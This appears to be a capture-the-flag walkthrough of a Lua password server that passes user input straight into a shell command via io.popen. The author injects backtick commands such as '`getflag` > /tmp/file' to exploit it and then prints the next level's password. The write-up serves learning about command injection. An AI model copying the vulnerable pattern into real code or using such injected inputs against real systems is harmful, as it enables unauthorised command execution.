We find a `.lua` file here, which is a programming language, so let’s read the file to see what it does

```bash
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

This file sets up a TCP server listening for connections on IP `127.0.0.1` at port 5151.

Once connected the server prompts a password, hashes the input with SHA-1 alogrithm, and compares it to a hardcoded hash. Based on this comparison it sends a response to the client.

To check how it works let us listen using that port

```bash
nc 127.0.0.1 5151
```

It asks for a password as expected so let’s try to excute some commands

```bash
getflag: error
`getflag`: error
getflag > /tmp/file: error but saves the output
`getflag` > /tmp/file: error but we get the flag
```

Let’s go on

```bash
su level12
Password: fa6v5ateaw21peobuub8ipe6s
```